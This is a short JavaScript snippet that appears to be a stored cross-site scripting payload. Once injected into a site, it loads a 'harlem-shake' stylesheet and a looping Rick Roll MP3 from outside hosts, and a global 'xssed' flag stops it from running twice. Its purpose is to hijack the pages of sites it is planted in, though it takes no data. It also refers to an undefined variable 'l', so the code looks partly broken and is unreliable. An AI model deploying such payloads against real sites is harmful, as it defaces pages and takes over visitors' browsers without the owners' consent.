if (typeof xssed == 'undefined') {
    !
        function () {

            var b, v;
            (v = document.createElement("link")).setAttribute("type", "text/css"),
                v.setAttribute("rel", "stylesheet"),
                v.setAttribute("href", "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css"),
                v.setAttribute("class", l),
                document.body.appendChild(v),
                (b = document.createElement("audio")).setAttribute("class", l),
                b.src = "//0-dayff13r.github.io/Stored-XSS-Rick-Roll/rickroll.mp3",
                b.loop = !1,
                b.addEventListener("ended", function () {
                    b.currentTime = 0;
                    b.play();
                }),
                b.play();
        }();
    var xssed = 1
}
